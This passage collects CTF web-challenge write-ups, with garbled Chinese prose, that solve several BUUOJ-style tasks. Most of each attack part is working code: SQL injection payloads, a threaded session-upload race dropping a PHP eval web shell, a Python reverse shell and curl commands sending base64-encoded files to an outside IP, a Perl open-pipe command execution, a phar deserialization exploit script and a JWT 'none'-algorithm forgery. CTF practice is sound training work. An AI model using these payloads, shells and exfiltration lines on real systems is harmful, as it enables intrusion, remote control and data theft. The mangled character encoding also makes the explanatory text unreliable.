$db-\u0026gt;query($sql); if(!$result) { echo \u0026#39;error\u0026#39;; print_r($db-\u0026gt;error); exit; } ä¸€çœ¼äºŒæ¬¡æ³¨å…¥,è¿™é‡Œå¯ä»¥åœ¨åœ°å€çš„åœ°æ–¹æ³¨å…¥\nç›´æ¥ç”¨æŠ¥é”™æ³¨å…¥çš„æ–¹å¼æ³¨å…¥\n1 2 1\u0026#39; or updatexml(1,concat(0x7e,(select substr(load_file(\u0026#39;/flag.txt\u0026#39;),1,30))),1)# 1\u0026#39; or updatexml(1,concat(0x7e,(select substr(load_file(\u0026#39;/flag.txt\u0026#39;),30,60))),1)# æˆ–è€…æ„é€ user_idçš„å½¢å¼æ¥æ³¨å…¥\n1 1\u0026#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(\u0026#39;/flag.txt\u0026#39;),1,30)),0x7e),1)# ä¹Ÿå¯ä»¥è¿™æ ·è®©ä»–æŠ¥é”™\n1 1\u0026#39;,`user_id`=database()# 1 1\u0026#39;,`user_id`=(select(group_concat(schema_name))from(information_schema.schemata))# 1 \u0026#39;,`user_id`=(select(group_concat(table_name))from(information_schema.tables)where(table_schema=\u0026#39;ctftraining\u0026#39;))# 1 \u0026#39;,`user_id`=(select(group_concat(column_name))from(information_schema.columns)where(table_name=\u0026#39;FLAG_TABLE\u0026#39;))# 1 2 \u0026#39;,`user_id`=(select FLAG_COLUMN from ctftraining.FLAG_TABLE limit 0,1)# è¿™é‡ŒæŸ¥å‡ºæ¥ç©ºçš„ï¼Œæ‰€ä»¥åªèƒ½ç”¨ä¸Šé¢çš„åŠæ³•\n[WMCTF2020]Make PHP Great Again è¿™é¢˜ç”¨sessionåŒ…å«å¯ä»¥è§£å†³æ˜¯éé¢„æœŸ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 import io import requests import threading sessid = \u0026#39;bbbbbbb\u0026#39; data = {\u0026#34;cmd\u0026#34;:\u0026#34;system(\u0026#39;cat flag.php\u0026#39;);\u0026#34;} def write(session): while True: f = io.BytesIO(b\u0026#39;a\u0026#39; * 1024 * 50) resp = session.post( \u0026#39;http://b0634b8b-ad08-4453-9292-3efff2a49706.node5.buuoj.cn:81/\u0026#39;, data={\u0026#39;PHP_SESSION_UPLOAD_PROGRESS\u0026#39;: \u0026#39;\u0026lt;?php eval($_POST[\u0026#34;cmd\u0026#34;]);?\u0026gt;\u0026#39;}, files={\u0026#39;file\u0026#39;: (\u0026#39;1.txt\u0026#39;,f)}, cookies={\u0026#39;PHPSESSID\u0026#39;: sessid} ) def read(session): while True: resp = session.post(\u0026#39;http://b0634b8b-ad08-4453-9292-3efff2a49706.node5.buuoj.cn:81/?file=/tmp/sess_\u0026#39;+sessid,data=data) if \u0026#39;1.txt\u0026#39; in resp.text: print(resp.text) event.clear() else: print(\u0026#34;[+++++++++++++]retry\u0026#34;) if __name__==\u0026#34;__main__\u0026#34;: event=threading.Event() with requests.session() as session: for i in range(1,30): threading.Thread(target=write,args=(session,)).start() for i in range(1,30): threading.Thread(target=read,args=(session,)).start() event.set() é¢„æœŸè§£æ˜¯è¦ç”¨åˆ°require_onceåŒ…å«çš„è½¯é“¾æ¥å±‚æ•°è¾ƒå¤šæ—¶onceçš„hashåŒ¹é…ä¼šç›´æ¥å¤±æ•ˆé€ æˆé‡å¤åŒ…å«\n[phpæºç åˆ†æ require_once ç»•è¿‡ä¸èƒ½é‡å¤åŒ…å«æ–‡ä»¶çš„é™åˆ¶][https://www.anquanke.com/post/id/213235]\n1 php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php [ç½‘é¼æ¯ 2020 ç™½è™ç»„]PicDown éé¢„æœŸ\nå­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–\nç›´æ¥è¯»/flag\né¢„æœŸ\n1 2 3 è¯»å– /proc/self/environ /proc/self/cmdline æœ‰ä¸ªapp.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 from flask import Flask, Response from flask import render_template from flask import request import os import urllib app = Flask(__name__) SECRET_FILE = \u0026#34;/tmp/secret.txt\u0026#34; f = open(SECRET_FILE) SECRET_KEY = f.read().strip() os.remove(SECRET_FILE) @app.route(\u0026#39;/\u0026#39;) def index(): return render_template(\u0026#39;search.html\u0026#39;) @app.route(\u0026#39;/page\u0026#39;) def page(): url = request.args.get(\u0026#34;url\u0026#34;) try: if not url.lower().startswith(\u0026#34;file\u0026#34;): res = urllib.urlopen(url) value = res.read() response = Response(value, mimetype=\u0026#39;application/octet-stream\u0026#39;) response.headers[\u0026#39;Content-Disposition\u0026#39;] = \u0026#39;attachment; filename=beautiful.jpg\u0026#39; return response else: value = \u0026#34;HACK ERROR!\u0026#34; except: value = \u0026#34;SOMETHING WRONG!\u0026#34; return render_template(\u0026#39;search.html\u0026#39;, res=value) @app.route(\u0026#39;/no_one_know_the_manager\u0026#39;) def manager(): key = request.args.get(\u0026#34;key\u0026#34;) print(SECRET_KEY) if key == SECRET_KEY: shell = request.args.get(\u0026#34;shell\u0026#34;) os.system(shell) res = \u0026#34;ok\u0026#34; else: res = \u0026#34;Wrong Key!\u0026#34; return res if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=8080) æœ€åè¿™ä¸ªè·¯ç”±è¦æ±‚secretkey\næ³¨æ„å…³äºSECRET_KEYçš„é€»è¾‘ï¼Œè™½ç„¶è¯¥æ–‡ä»¶åœ¨æ‰“å¼€è¯»å–åè¢«åˆ é™¤äº†ï¼Œä½†æ˜¯æ³¨æ„è¿™ä¸ªæ–‡ä»¶æ²¡æœ‰å…³é—­ï¼Œæ‰€ä»¥ä»ç„¶å¯ä»¥é€šè¿‡/proc/self/fd/[num]è®¿é—®å¯¹åº”æ–‡ä»¶ï¼ˆæ­¤å¤„[num]ä»£è¡¨ä¸€ä¸ªæœªçŸ¥çš„æ•°å€¼ï¼Œéœ€è¦ä»0å¼€å§‹éå†æ‰¾å‡ºï¼‰ï¼Œè¿™é‡Œåœ¨/proc/self/fd/3æ‰¾åˆ°\n1 07trZJM8Dfcrv49T5kZfWO7Y048PjXzSh2Q6+Gu7x9c= ä¸‹é¢å°±æ˜¯å¼¹shell\n1 2 3 nc -lvp 3333 /no_one_know_the_manager?key=07trZJM8Dfcrv49T5kZfWO7Y048PjXzSh2Q6+Gu7x9c=\u0026amp;shell=python -c \u0026#34;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#39;47.122.53.248\u0026#39;,3333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\u0026#39;/bin/bash\u0026#39;,\u0026#39;-i\u0026#39;]);\u0026#34; 1 /no_one_know_the_manager?key=07trZJM8Dfcrv49T5kZfWO7Y048PjXzSh2Q6+Gu7x9c=\u0026amp;shell=python%20-c%20%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2247.122.53.248%22,3333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27 æˆ–è€…curlæŠŠæ•°æ®å¤–å¸¦\n1 2 ?key=07trZJM8Dfcrv49T5kZfWO7Y048PjXzSh2Q6+Gu7x9c=\u0026amp;shell=curl 47.122.53.248:3333/`ls /|base64` ?key=07trZJM8Dfcrv49T5kZfWO7Y048PjXzSh2Q6+Gu7x9c=\u0026amp;shell=curl 47.122.53.248:3333/`cat /flag|base64` [HITCON 2017]SSRFme ä»£ç å®¡è®¡\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;?php if (isset($_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;])) { $http_x_headers = explode(\u0026#39;,\u0026#39;, $_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;]); $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;] = $http_x_headers[0]; } echo $_SERVER[\u0026#34;REMOTE_ADDR\u0026#34;]; $sandbox = \u0026#34;sandbox/\u0026#34; . md5(\u0026#34;orange\u0026#34; . $_SERVER[\u0026#34;REMOTE_ADDR\u0026#34;]); @mkdir($sandbox); @chdir($sandbox); $data = shell_exec(\u0026#34;GET \u0026#34; . escapeshellarg($_GET[\u0026#34;url\u0026#34;])); $info = pathinfo($_GET[\u0026#34;filename\u0026#34;]); $dir = str_replace(\u0026#34;.\u0026#34;, \u0026#34;\u0026#34;, basename($info[\u0026#34;dirname\u0026#34;])); @mkdir($dir); @chdir($dir); @file_put_contents(basename($info[\u0026#34;basename\u0026#34;]), $data); highlight_file(__FILE__); orange+ipçš„MD5å€¼å°±æ˜¯ç›®å½•ï¼Œç„¶åurlä¼ dataå€¼ç»™åé¢filenameå†™å…¥çš„æ–‡ä»¶\né¢˜ç›®å«ssrfmeï¼Œæˆ‘ä»¬å…ˆfile://è¯»ä¸€ä¸‹æ–‡ä»¶\n1 ?url=file:///\u0026amp;filename=123 è®¿é—®flagæ˜¯ç©ºçš„ï¼Œä¸‹é¢æœ‰ä¸ªreadflagæ˜¾ç„¶è¦ç”¨å‘½ä»¤æ‰§è¡Œreadflagæ‰è¡Œ\nè¿™é‡Œæœ‰å‰ç½®çŸ¥è¯†ï¼Œåˆ©ç”¨perlè¯­è¨€çš„æ¼æ´ï¼šå› ä¸ºGETå‡½æ•°åœ¨åº•å±‚è°ƒç”¨äº†perlè¯­è¨€ä¸­çš„openå‡½æ•°ï¼Œä½†æ˜¯è¯¥å‡½æ•°å­˜åœ¨rceæ¼æ´ã€‚å½“openå‡½æ•°è¦æ‰“å¼€çš„æ–‡ä»¶åä¸­å­˜åœ¨ç®¡é“ç¬¦ï¼ˆå¹¶ä¸”ç³»ç»Ÿä¸­å­˜åœ¨è¯¥æ–‡ä»¶åï¼‰ï¼Œå°±ä¼šä¸­æ–­åŸæœ‰æ‰“å¼€æ–‡ä»¶æ“ä½œï¼Œå¹¶ä¸”æŠŠè¿™ä¸ªæ–‡ä»¶åå½“ä½œä¸€ä¸ªå‘½ä»¤æ¥æ‰§è¡Œã€‚\nå…ˆåˆ›å»ºæ–‡ä»¶\n1 ?url=\u0026amp;filename=|/readflag ç„¶åæ‰§è¡Œå‘½ä»¤\n1 ?url=file:|readflag\u0026amp;filename=123 ä½†æ˜¯è¿™ä¸ªå¥½åƒæœ‰ç‚¹é—®é¢˜ï¼Œç”¨bashå‘½ä»¤è¯•è¯•\n1 2 ?url=\u0026amp;filename=|bash -c /readflag ?url=file:|bash -c /readflag\u0026amp;filename=123 æˆ–è€…ç›´æ¥å†™é©¬èšå‰‘è¿æ¥\n1 ?url=data://text,plain,\u0026#39;\u0026lt;?php @eval($_POST[\u0026#39;cmd\u0026#39;]);?\u0026gt;\u0026#39;\u0026amp;filename=shell.php [CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox æ³¨å†Œç™»å…¥åæœ‰æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼Œä¸èƒ½ä¸Šä¼ php\nä¸Šä¼ å…¶ä»–æ–‡ä»¶æœ‰ä¸‹è½½åŠŸèƒ½å­˜åœ¨ç›®å½•ç©¿è¶Š\nindex.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;?php session_start(); if (!isset($_SESSION[\u0026#39;login\u0026#39;])) { header(\u0026#34;Location: login.php\u0026#34;); die(); } ?\u0026gt; \u0026lt;?php include \u0026#34;class.php\u0026#34;; $a = new FileList($_SESSION[\u0026#39;sandbox\u0026#39;]); $a-\u0026gt;Name(); $a-\u0026gt;Size(); ?\u0026gt; class.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 \u0026lt;?php error_reporting(0); $dbaddr = \u0026#34;127.0.0.1\u0026#34;; $dbuser = \u0026#34;root\u0026#34;; $dbpass = \u0026#34;root\u0026#34;; $dbname = \u0026#34;dropbox\u0026#34;; $db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname); class User { public $db; public function __construct() { global $db; $this-\u0026gt;db = $db; } public function user_exist($username) { $stmt = $this-\u0026gt;db-\u0026gt;prepare(\u0026#34;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;\u0026#34;); $stmt-\u0026gt;bind_param(\u0026#34;s\u0026#34;, $username); $stmt-\u0026gt;execute(); $stmt-\u0026gt;store_result(); $count = $stmt-\u0026gt;num_rows; if ($count === 0) { return false; } return true; } public function add_user($username, $password) { if ($this-\u0026gt;user_exist($username)) { return false; } $password = sha1($password . \u0026#34;SiAchGHmFx\u0026#34;); $stmt = $this-\u0026gt;db-\u0026gt;prepare(\u0026#34;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);\u0026#34;); $stmt-\u0026gt;bind_param(\u0026#34;ss\u0026#34;, $username, $password); $stmt-\u0026gt;execute(); return true; } public function verify_user($username, $password) { if (!$this-\u0026gt;user_exist($username)) { return false; } $password = sha1($password . \u0026#34;SiAchGHmFx\u0026#34;); $stmt = $this-\u0026gt;db-\u0026gt;prepare(\u0026#34;SELECT `password` FROM `users` WHERE `username` = ?;\u0026#34;); $stmt-\u0026gt;bind_param(\u0026#34;s\u0026#34;, $username); $stmt-\u0026gt;execute(); $stmt-\u0026gt;bind_result($expect); $stmt-\u0026gt;fetch(); if (isset($expect) \u0026amp;\u0026amp; $expect === $password) { return true; } return false; } public function __destruct() { $this-\u0026gt;db-\u0026gt;close(); } } class FileList { private $files; private $results; private $funcs; public function __construct($path) { $this-\u0026gt;files = array(); $this-\u0026gt;results = array(); $this-\u0026gt;funcs = array(); $filenames = scandir($path); $key = array_search(\u0026#34;.\u0026#34;, $filenames); unset($filenames[$key]); $key = array_search(\u0026#34;..\u0026#34;, $filenames); unset($filenames[$key]); foreach ($filenames as $filename) { $file = new File(); $file-\u0026gt;open($path . $filename); array_push($this-\u0026gt;files, $file); $this-\u0026gt;results[$file-\u0026gt;name()] = array(); } } public function __call($func, $args) { array_push($this-\u0026gt;funcs, $func); foreach ($this-\u0026gt;files as $file) { $this-\u0026gt;results[$file-\u0026gt;name()][$func] = $file-\u0026gt;$func(); } } public function __destruct() { $table = \u0026#39;\u0026lt;div id=\u0026#34;container\u0026#34; class=\u0026#34;container\u0026#34;\u0026gt;\u0026lt;div class=\u0026#34;table-responsive\u0026#34;\u0026gt;\u0026lt;table id=\u0026#34;table\u0026#34; class=\u0026#34;table table-bordered table-hover sm-font\u0026#34;\u0026gt;\u0026#39;; $table .= \u0026#39;\u0026lt;thead\u0026gt;\u0026lt;tr\u0026gt;\u0026#39;; foreach ($this-\u0026gt;funcs as $func) { $table .= \u0026#39;\u0026lt;th scope=\u0026#34;col\u0026#34; class=\u0026#34;text-center\u0026#34;\u0026gt;\u0026#39; . htmlentities($func) . \u0026#39;\u0026lt;/th\u0026gt;\u0026#39;; } $table .= \u0026#39;\u0026lt;th scope=\u0026#34;col\u0026#34; class=\u0026#34;text-center\u0026#34;\u0026gt;Opt\u0026lt;/th\u0026gt;\u0026#39;; $table .= \u0026#39;\u0026lt;/thead\u0026gt;\u0026lt;tbody\u0026gt;\u0026#39;; foreach ($this-\u0026gt;results as $filename =\u0026gt; $result) { $table .= \u0026#39;\u0026lt;tr\u0026gt;\u0026#39;; foreach ($result as $func =\u0026gt; $value) { $table .= \u0026#39;\u0026lt;td class=\u0026#34;text-center\u0026#34;\u0026gt;\u0026#39; . htmlentities($value) . \u0026#39;\u0026lt;/td\u0026gt;\u0026#39;; } $table .= \u0026#39;\u0026lt;td class=\u0026#34;text-center\u0026#34; filename=\u0026#34;\u0026#39; . htmlentities($filename) . \u0026#39;\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;#\u0026#34; class=\u0026#34;download\u0026#34;\u0026gt;ä¸‹è½½\u0026lt;/a\u0026gt; / \u0026lt;a href=\u0026#34;#\u0026#34; class=\u0026#34;delete\u0026#34;\u0026gt;åˆ é™¤\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026#39;; $table .= \u0026#39;\u0026lt;/tr\u0026gt;\u0026#39;; } echo $table; } } class File { public $filename; public function open($filename) { $this-\u0026gt;filename = $filename; if (file_exists($filename) \u0026amp;\u0026amp; !is_dir($filename)) { return true; } else { return false; } } public function name() { return basename($this-\u0026gt;filename); } public function size() { $size = filesize($this-\u0026gt;filename); $units = array(\u0026#39; B\u0026#39;, \u0026#39; KB\u0026#39;, \u0026#39; MB\u0026#39;, \u0026#39; GB\u0026#39;, \u0026#39; TB\u0026#39;); for ($i = 0; $size \u0026gt;= 1024 \u0026amp;\u0026amp; $i \u0026lt; 4; $i++) $size /= 1024; return round($size, 2).$units[$i]; } public function detele() { unlink($this-\u0026gt;filename); } public function close() { return file_get_contents($this-\u0026gt;filename); } } ?\u0026gt; download.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \u0026lt;?php session_start(); if (!isset($_SESSION[\u0026#39;login\u0026#39;])) { header(\u0026#34;Location: login.php\u0026#34;); die(); } if (!isset($_POST[\u0026#39;filename\u0026#39;])) { die(); } include \u0026#34;class.php\u0026#34;; ini_set(\u0026#34;open_basedir\u0026#34;, getcwd() . \u0026#34;:/etc:/tmp\u0026#34;); chdir($_SESSION[\u0026#39;sandbox\u0026#39;]); $file = new File(); $filename = (string) $_POST[\u0026#39;filename\u0026#39;]; if (strlen($filename) \u0026lt; 40 \u0026amp;\u0026amp; $file-\u0026gt;open($filename) \u0026amp;\u0026amp; stristr($filename, \u0026#34;flag\u0026#34;) === false) { Header(\u0026#34;Content-type: application/octet-stream\u0026#34;); Header(\u0026#34;Content-Disposition: attachment; filename=\u0026#34; . basename($filename)); echo $file-\u0026gt;close(); } else { echo \u0026#34;File not exist\u0026#34;; } ?\u0026gt; delete.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 \u0026lt;?php session_start(); if (!isset($_SESSION[\u0026#39;login\u0026#39;])) { header(\u0026#34;Location: login.php\u0026#34;); die(); } if (!isset($_POST[\u0026#39;filename\u0026#39;])) { die(); } include \u0026#34;class.php\u0026#34;; chdir($_SESSION[\u0026#39;sandbox\u0026#39;]); $file = new File(); $filename = (string) $_POST[\u0026#39;filename\u0026#39;]; if (strlen($filename) \u0026lt; 40 \u0026amp;\u0026amp; $file-\u0026gt;open($filename)) { $file-\u0026gt;detele(); Header(\u0026#34;Content-type: application/json\u0026#34;); $response = array(\u0026#34;success\u0026#34; =\u0026gt; true, \u0026#34;error\u0026#34; =\u0026gt; \u0026#34;\u0026#34;); echo json_encode($response); } else { Header(\u0026#34;Content-type: application/json\u0026#34;); $response = array(\u0026#34;success\u0026#34; =\u0026gt; false, \u0026#34;error\u0026#34; =\u0026gt; \u0026#34;File not exist\u0026#34;); echo json_encode($response); } ?\u0026gt; æ„é“¾å­\nå› ä¸ºFileç±»ä¸‹é¢æœ‰file_get_contentså¯ä»¥è¯»å–æ–‡ä»¶ï¼Œè°ƒç”¨äº†closeå‡½æ•°\næŸ¥æ‰¾åˆ°Userç±»é‡Œé¢æœ‰ï¼Œä½†æ˜¯è¿™æ ·è°ƒç”¨ä¼šè§¦å‘__callæ–¹æ³•ï¼Œæˆ‘ä»¬ç”¨Filelistç±»é‡Œé¢çš„__callå‘ç°fileså˜é‡ä¼šæ‰§è¡Œå‡½æ•°æŠŠç»“æœä»¥æ•°ç»„å½¢å¼è¿”å›ï¼Œæˆ‘ä»¬ç›´æ¥ä»¤å®ƒä¸ºFileç±»ï¼Œå°†flagè¿”å›ç„¶åè°ƒç”¨closeå‡½æ•°å›æ˜¾\n1 User -\u0026gt;Filelist call -\u0026gt;File close() exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 \u0026lt;?php class User { public $db; } class FileList { private $files; public function __construct() { $this-\u0026gt;files = array(new File()); } } class File { public $filename=\u0026#39;/flag.txt\u0026#39;; public function close() { return file_get_contents($this-\u0026gt;filename); } } $o=new User(); $o-\u0026gt;db=new FileList(); @unlink(\u0026#34;phar.phar\u0026#34;); //ç”Ÿæˆpharæ—¶ï¼Œæ–‡ä»¶çš„åç¼€åå¿…é¡»ä¸ºphar $phar = new Phar(\u0026#34;phar.phar\u0026#34;); $phar-\u0026gt;startBuffering(); //è®¾ç½®stub $phar-\u0026gt;setStub(\u0026#39;GIF89a\u0026#39;.\u0026#39;\u0026lt;?php __HALT_COMPILER();?\u0026gt;\u0026#39;); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifestï¼Œè¿™ä¸ªæ˜¯åˆ©ç”¨çš„é‡ç‚¹ $phar-\u0026gt;setMetadata($o); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶å¯ä»¥ä¸å­˜åœ¨ï¼Œä½†è¿™å¥è¯­å¥ä¸èƒ½å°‘ $phar-\u0026gt;addFromString(\u0026#34;test.txt\u0026#34;, \u0026#34;test\u0026#34;); //ç­¾åè‡ªåŠ¨è®¡ç®— $phar-\u0026gt;stopBuffering(); ?\u0026gt; ç”Ÿæˆpharåï¼Œæ‰¾è§¦å‘ååºåˆ—åŒ–åˆ©ç”¨ç‚¹\ndownloadå’Œdeleteé‡Œé¢ç”±äºdownloadè¿‡æ»¤flag\næˆ‘ä»¬åœ¨delete.phpé‡Œé¢æ‰¾åˆ°deleteå‡½æ•°ï¼Œå›åˆ°class.phpå‘ç°è°ƒç”¨unlinkå‡½æ•°åˆšå¥½å¯ä»¥è§¦å‘ååºåˆ—åŒ–\n[HFCTF2020]EasyLogin ä¸Šæ¥æŸ¥çœ‹æºç \napp.js\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 /** * æˆ–è®¸è¯¥ç”¨ koa-static æ¥å¤„ç†é™æ€æ–‡ä»¶ * è·¯å¾„è¯¥æ€ä¹ˆé…ç½®ï¼Ÿä¸ç®¡äº†å…ˆå¡«ä¸ªæ ¹ç›®å½•XD */ function login() { const username = $(\u0026#34;#username\u0026#34;).val(); const password = $(\u0026#34;#password\u0026#34;).val(); const token = sessionStorage.getItem(\u0026#34;token\u0026#34;); $.post(\u0026#34;/api/login\u0026#34;, {username, password, authorization:token}) .done(function(data) { const {status} = data; if(status) { document.location = \u0026#34;/home\u0026#34;; } }) .fail(function(xhr, textStatus, errorThrown) { alert(xhr.responseJSON.message); }); } function register() { const username = $(\u0026#34;#username\u0026#34;).val(); const password = $(\u0026#34;#password\u0026#34;).val(); $.post(\u0026#34;/api/register\u0026#34;, {username, password}) .done(function(data) { const { token } = data; sessionStorage.setItem(\u0026#39;token\u0026#39;, token); document.location = \u0026#34;/login\u0026#34;; }) .fail(function(xhr, textStatus, errorThrown) { alert(xhr.responseJSON.message); }); } function logout() { $.get(\u0026#39;/api/logout\u0026#39;).done(function(data) { const {status} = data; if(status) { document.location = \u0026#39;/login\u0026#39;; } }); } function getflag() { $.get(\u0026#39;/api/flag\u0026#39;).done(function(data) { const {flag} = data; $(\u0026#34;#username\u0026#34;).val(flag); }).fail(function(xhr, textStatus, errorThrown) { alert(xhr.responseJSON.message); }); } ä¸Šé¢è¯´ç”¨koaæ¡†æ¶å†™çš„\nkoaæ¡†æ¶åŸºæœ¬ç›®å½• 1 2 3 4 5 6 7 8 9 10 11 koaæ¡†æ¶å¸¸ç”¨ç›®å½•ï¼Œæ–‡ä»¶ app/controllers é¡¹ç›®æ§åˆ¶å™¨å­˜æ”¾ç›®å½•ï¼šæ¥æ”¶è¯·æ±‚ï¼Œå¤„ç†é€»è¾‘ app/dbhelper æ•°æ®åº“CRUDæ“ä½œçš„å°è£… app/models å¯¹åº”æ•°æ®åº“è¡¨è¡¨ç»“æ„ config/router.js é¡¹ç›®è·¯ç”± node_modules app.js é¡¹ç›®å…¥å£ è®¿é—®controllersä¸‹çš„api.jså¾—åˆ°æºç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 const crypto = require(\u0026#39;crypto\u0026#39;); const fs = require(\u0026#39;fs\u0026#39;) const jwt = require(\u0026#39;jsonwebtoken\u0026#39;) const APIError = require(\u0026#39;../rest\u0026#39;).APIError; module.exports = { \u0026#39;POST /api/register\u0026#39;: async (ctx, next) =\u0026gt; { const {username, password} = ctx.request.body; if(!username || username === \u0026#39;admin\u0026#39;){ throw new APIError(\u0026#39;register error\u0026#39;, \u0026#39;wrong username\u0026#39;); } if(global.secrets.length \u0026gt; 100000) { global.secrets = []; } const secret = crypto.randomBytes(18).toString(\u0026#39;hex\u0026#39;); const secretid = global.secrets.length; global.secrets.push(secret) const token = jwt.sign({secretid, username, password}, secret, {algorithm: \u0026#39;HS256\u0026#39;}); ctx.rest({ token: token }); await next(); }, \u0026#39;POST /api/login\u0026#39;: async (ctx, next) =\u0026gt; { const {username, password} = ctx.request.body; if(!username || !password) { throw new APIError(\u0026#39;login error\u0026#39;, \u0026#39;username or password is necessary\u0026#39;); } const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization; const sid = JSON.parse(Buffer.from(token.split(\u0026#39;.\u0026#39;)[1], \u0026#39;base64\u0026#39;).toString()).secretid; console.log(sid) if(sid === undefined || sid === null || !(sid \u0026lt; global.secrets.length \u0026amp;\u0026amp; sid \u0026gt;= 0)) { throw new APIError(\u0026#39;login error\u0026#39;, \u0026#39;no such secret id\u0026#39;); } const secret = global.secrets[sid]; const user = jwt.verify(token, secret, {algorithm: \u0026#39;HS256\u0026#39;}); const status = username === user.username \u0026amp;\u0026amp; password === user.password; if(status) { ctx.session.username = username; } ctx.rest({ status }); await next(); }, \u0026#39;GET /api/flag\u0026#39;: async (ctx, next) =\u0026gt; { if(ctx.session.username !== \u0026#39;admin\u0026#39;){ throw new APIError(\u0026#39;permission error\u0026#39;, \u0026#39;permission denied\u0026#39;); } const flag = fs.readFileSync(\u0026#39;/flag\u0026#39;).toString(); ctx.rest({ flag }); await next(); }, \u0026#39;GET /api/logout\u0026#39;: async (ctx, next) =\u0026gt; { ctx.session.username = null; ctx.rest({ status: true }) await next(); } }; jwtæ— ç­¾å\nä¸ä»…ç­¾åè¦æ”¹ä¸ºnoneï¼Œsecretidè¦æ”¹ä¸º[]ï¼Œç„¶åæŠŠusernameæ”¹ä¸ºadmin\nè¿™é‡Œè½½çš„æ˜¯PyJWTåŒ…ï¼Œç”¨pythonæ¥ä¼ªé€ \n1 2 3 4 5 6 7 8 9 10 11 import jwt token = jwt.encode( { \u0026#34;secretid\u0026#34;: [], \u0026#34;username\u0026#34;: \u0026#34;admin\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;123456\u0026#34;, \u0026#34;iat\u0026#34;: 1742471740 }, algorithm=\u0026#34;none\u0026#34;, key=\u0026#34;\u0026#34;).encode(encoding=\u0026#39;utf-8\u0026#39;) print(token) bpä¿®æ”¹æ”¾åŒ…ç„¶åè®¿é—®/api/flag\n[SWPUCTF 2018]SimplePHP æŸ¥çœ‹æºç \næŸ¥çœ‹æ–‡ä»¶è¿™é‡Œæœ‰ä»»æ„æ–‡ä»¶è¯»å–\nindex.php\n1 2 3 4 \u0026lt;?php header(\u0026#34;content-type:text/html;charset=utf-8\u0026#34;); include \u0026#39;base.php\u0026#39;; ?\u0026gt; base.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 \u0026lt;?php session_start(); ?\u0026gt; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;web3\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; 